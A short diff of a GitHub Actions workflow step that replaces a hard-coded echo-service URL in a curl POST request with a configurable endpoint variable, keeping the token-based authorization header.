@@ -21,7 +21,7 @@ jobs:
           QueueResourceAllocation: false
           LocalCredentialHelper: false
         run: |
-          curl -X POST https://reqbin.com/echo/post/json 
+          curl -X POST "$ENDPOINT" 
            -H "Content-Type: application/json" 
            -H "Authorization: github $TOKEN"
            -H "accept: */*"
